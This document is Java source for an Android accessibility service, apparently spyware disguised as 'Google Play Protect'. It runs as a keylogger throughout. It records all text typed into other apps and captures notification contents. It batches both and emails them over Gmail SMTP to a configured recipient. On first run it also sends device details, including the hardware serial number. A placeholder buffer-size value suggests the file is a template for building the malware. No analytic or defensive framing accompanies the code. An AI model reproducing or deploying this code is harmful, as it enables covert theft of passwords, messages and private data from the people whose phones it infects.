package com;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.GooglePlayProtectService.R;

import java.util.List;
import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = MyAccessibilityService.class.getSimpleName();
    private final StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;
    private static final int MAX_BUFFER_SIZE = Buffer-Send-Size-UpdateME; // Adjust buffer size as needed

    @SuppressLint("LongLogTag")
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event);
                break;
            default:
                // Handle other event types if needed
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        // Handle text changed events
        List<CharSequence> textList = event.getText();
        for (CharSequence text : textList) {
            String newText = text.toString();
            int newKeyEventCount = countKeyEvents(newText);

            if (newKeyEventCount > keyEventCount) {
                currentKeyEvents.append(newText.substring(keyEventCount));

                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    sendEmail(currentKeyEvents.substring(0, MAX_BUFFER_SIZE));
                    currentKeyEvents.setLength(0); // Clear the builder
                }
            }

            keyEventCount = newKeyEventCount;
        }
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event) {
        StringBuilder notificationTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            notificationTextBuilder.append(text);
        }
        CharSequence notificationText = notificationTextBuilder.toString();

        if (!notificationText.toString().isEmpty()) {
            // Append notification text to the buffer along with log message
            currentKeyEvents.append("Notification: ").append(notificationText).append("\n");

            // Check buffer size
            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendEmail(currentKeyEvents.substring(0, MAX_BUFFER_SIZE));
                currentKeyEvents.setLength(0); // Clear the builder
            }
        }
    }

    private int countKeyEvents(String text) {
        // Count the number of key events (assuming each character is a key event)
        return text.length();
    }

    private void sendEmail(String log) {
        new MessageSender().execute(log);
    }

    private class MessageSender extends AsyncTask<String, Void, Void> {
        private static final String TAG = "MessageSender";

        @Override
        protected Void doInBackground(String... params) {
            String log = params[0];
            try {
                String USERNAME = getString(R.string.username);
                String APP_PASSWORD = getString(R.string.app_password);
                String RECIPIENT_EMAIL = getString(R.string.recipient_email);


                Properties props = new Properties();
                props.put("mail.smtp.auth", "true");
                props.put("mail.smtp.starttls.enable", "true");
                props.put("mail.smtp.host", "smtp.gmail.com");
                props.put("mail.smtp.port", "587");

                Authenticator auth = new Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(USERNAME, APP_PASSWORD);
                    }
                };

                Session session = Session.getInstance(props, auth);

                Message message = new MimeMessage(session);
                message.setFrom(new InternetAddress(USERNAME));
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(RECIPIENT_EMAIL));
                String manufacturer = Build.MANUFACTURER;
                String model = Build.MODEL;
                message.setSubject(manufacturer + " " + model);
                message.setText(log);

                Transport.send(message);
            } catch (MessagingException e) {
                Log.e(TAG, "Failed to send email: " + e.getMessage());
            }
            return null;
        }
    }

    @Override
    public void onInterrupt() {
        // Handle interruption
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);

        // Check if it's the first run
        SharedPreferences prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);

        if (isFirstRun) {
            // Gather device details
            String deviceDetails = getSYSInfo();

            // Send the gathered information to Gmail
            sendEmail(deviceDetails);

            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }

    @SuppressLint("HardwareIds")
    private String getSYSInfo() {
        return "MANUFACTURER : " + Build.MANUFACTURER + "\n" +
                "MODEL : " + Build.MODEL + "\n" +
                "PRODUCT : " + Build.PRODUCT + "\n" +
                "SERIAL : " + Build.SERIAL + "\n" +
                "VERSION.RELEASE : " + Build.VERSION.RELEASE + "\n" +
                "VERSION.INCREMENTAL : " + Build.VERSION.INCREMENTAL + "\n" +
                "VERSION.SDK.NUMBER : " + Build.VERSION.SDK_INT + "\n" +
                "BOARD : " + Build.BOARD + "\n";
    }
}
